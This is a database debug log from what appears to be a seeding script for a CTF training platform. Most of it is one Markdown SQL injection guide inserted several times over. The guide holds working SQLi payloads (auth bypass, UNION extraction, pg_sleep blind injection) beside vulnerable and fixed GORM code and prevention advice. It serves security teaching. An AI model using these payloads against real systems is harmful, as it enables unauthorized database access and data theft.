[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.434ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 57 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.371ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.781','2025-06-09 14:07:54.781',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,57) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.783ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.017ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.791','2025-06-09 14:07:54.791',NULL,'cyber security and rgiso','kWfpqhnvyWuyCfGfzFcrUzsBHFBMfdyKVjZPQZkcVfjXQGCHVXHABYlvSBWZtSrJPHAjbRCBFtCPXXYktWmKmKHDMtNqiwOLQmVY',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.675ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.596ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 58 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.390ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.799','2025-06-09 14:07:54.799',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,58) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.457ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[7.934ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.807','2025-06-09 14:07:54.807',NULL,'cyber security and akdbg','EJdCBnoaUoDyKixPuQMgREewngtsREQzxXftWHtvwxMowYmspZPEnQRjpAXqsbQobpazFFOyIQcQQYZuYuTNumbxHKeYcxxFoFQd',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.549ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.490ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 59 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.790ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.816','2025-06-09 14:07:54.816',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,59) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.535ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.823','2025-06-09 14:07:54.823',NULL,'cyber security and qhmfy','XGLHBdWcYutzmRHqBZgdaDKmnjvnTeLJdfeLrdNVEZcwHllvEGAVJHQFQIGeHuYaLjxvEvGUyRverBgOgrKPKSJLJpVKexyvYQsK',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.670ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[1.152ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 60 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[10.581ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.831','2025-06-09 14:07:54.831',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,60) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.484ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[9.638ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:54.841','2025-06-09 14:07:54.841',NULL,'cyber security and ehxhe','aznjUfanLOJvUuxgcmVTHYiAmklqMydtDnFhUDByrcNyKNtMFVawdZrbPFhCAvqpRriJkgEhyuHLuMQVjGvvGZSeAQpfebvdhUJs',100,2) RETURNING "id"

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.525ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.488ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 61 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:54 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[9.311ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:54.851','2025-06-09 14:07:54.851',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

